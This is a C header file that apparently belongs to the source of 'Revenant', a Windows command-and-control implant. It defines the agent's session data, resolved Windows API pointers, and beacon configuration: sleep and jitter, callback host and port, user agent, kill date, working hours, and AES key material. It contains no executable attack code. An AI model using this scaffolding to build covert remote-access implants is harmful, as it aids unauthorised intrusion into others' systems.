#ifndef REVENANT_REVENANT_H
#define REVENANT_REVENANT_H

#include <windows.h>
#include <tchar.h>

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

#define PROCESS_ARCH_UNKNOWN    0
#define PROCESS_ARCH_X86		1
#define PROCESS_ARCH_X64		2
#define PROCESS_ARCH_IA64       3

#ifdef _WIN64
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X64
#elif _WIN32
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X86
#else
#define PROCESS_AGENT_ARCH PROCESS_ARCH_UNKNOWN

#endif

#define RVNT_MAGIC_VALUE (UINT32) 'rvnt'

typedef struct _INSTANCE {
    struct {
        UINT32  AgentID;
        WORD    ProcArch;
        WORD    OSArch;
        BOOL    Connected;
    } Session;

    struct {
        ULONG ( WINAPI *RtlRandomEx   ) ( PULONG );
        VOID  ( WINAPI* RtlGetVersion ) ( POSVERSIONINFOEXW );
    } Win32;

    struct {
        DWORD Sleeping;
        DWORD Jitter;

        struct {
            LPWSTR UserAgent;
            LPWSTR Host;
            DWORD  Port;
            UINT64 KillDate;
            UINT32 WorkingHours;

            BOOL   Secure;
        } Transport ;

        // Encryption / Decryption
        struct {
            PBYTE Key;
            PBYTE IV;
        } AES;
    } Config;

} INSTANCE, *PINSTANCE;

extern INSTANCE Instance;

#endif //REVENANT_REVENANT_H
